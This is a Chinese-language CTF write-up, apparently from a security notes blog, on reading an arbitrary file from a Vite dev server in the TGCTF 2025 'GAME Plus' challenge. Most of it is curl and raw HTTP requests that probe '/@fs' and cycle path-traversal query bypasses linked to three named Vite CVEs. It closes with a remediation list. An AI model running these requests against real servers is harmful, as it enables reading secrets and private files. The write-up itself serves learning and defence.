---
title: "TGCTF 2025 前端 GAME Plus：任意文件读取"
slug: "tgctf-2025-vite-game-plus"
date: 2026-09-02T18:21:12+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "前端游戏的版本指纹与 CVE 组合利用。"
summary: "前端游戏的版本指纹与 CVE 组合利用。"
tags: ["Vite", "CVE", "TGCTF"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 12
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/20.TG2025前端GAME Plus(任意文件读取漏洞).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/tgctf-2025-vite-game-plus/workflow.svg" alt="前端资源暴露开发服务器入口，路径参数被 Vite 用于读取任意文件。" loading="lazy">
  <figcaption>图 1 · Vite GAME Plus 文件读取。前端资源暴露开发服务器入口，路径参数被 Vite 用于读取任意文件。</figcaption>
</figure>

## 1. 题目结构

TGCTF 2025 前端小游戏使用 Vite + Vue 3。页面游戏分在客户端逻辑里，
但目标文件 `/tgflagggg` 位于服务器文件系统根目录，因此需要找开发服务器的
文件读取绕过，而不是继续玩游戏。

```bash
export TARGET='http://127.0.0.1:<target-port>'
```

## 2. 识别 Vite

```bash
curl -sS -i "$TARGET/" --max-time 10
curl -sS "$TARGET/package.json"
curl -sS "$TARGET/@vite/client" -o /tmp/vite-client.js
curl -sS "$TARGET/src/main.js" -o /tmp/main.js
```

进一步读取源码入口：

```bash
for path in \
  /src/App.vue \
  /src/router/index.ts \
  /src/views/stage/pc.vue \
  /src/views/stage/mobile.vue \
  /src/utils/stage.ts; do
  echo "== $path"
  curl -sS "$TARGET$path" | head -n 80
done
```

## 3. 验证 SPA fallback

```bash
curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "$TARGET/tgflagggg"
curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "$TARGET/tgflagggg/"
```

如果两者都是 SPA 的 `index.html`，说明普通 HTTP 路径拿不到文件，需要 `@fs`。

## 4. 测 `@fs`

```bash
for path in \
  '/@fs/tgflagggg' \
  '/@fs//tgflagggg' \
  '/@fs///tgflagggg'; do
  echo "== $path"
  curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "$TARGET$path"
done
```

403 或 404 都是信息：403 表示映射到 allow-list，404 可能路径不对。

## 5. CVE 变体循环

```bash
for suffix in '?raw??' '?raw&import' '?import&raw' '?raw' '?import&raw??'; do
  url="$TARGET/@fs//tgflagggg${suffix}"
  echo "== $url"
  curl -sS -w '\n[%{http_code}]\n' "$url"
done
```

不同版本对应不同绕过：

- CVE-2025-30208：`?raw??`
- CVE-2025-31125：`?raw&import`
- CVE-2025-31486：`?import&raw`

题目环境不一定完全对应某个示例，只要响应返回文件内容即可。

## 6. 如果 curl 规范化 URL

用 Burp Repeater 直接发送原始请求：

```http
GET /@fs//tgflagggg?raw?? HTTP/1.1
Host: 127.0.0.1:<target-port>
Accept: */*
Connection: close
```

必要时使用：

```bash
curl --path-as-is -sS "$TARGET/@fs//tgflagggg?raw??"
```

## 7. 排错

| 现象 | 原因 |
| --- | --- |
| 所有路径都返回 SPA | 没有命中 Vite 文件服务 |
| 403 | 版本已修复或 allow-list 正确 |
| 200 但内容为空 | query 变体不匹配 |
| 读到项目内文件但读不到根目录 | `server.fs.allow` 与 CVE 变体问题 |

## 8. 修复

- 升级 Vite 到安全版本；
- 开发服务器只绑定 127.0.0.1；
- 不把开发服务器部署到公网；
- 反向代理禁止 `/@fs`；
- 生产构建使用静态文件服务器，不启动 Vite dev server。
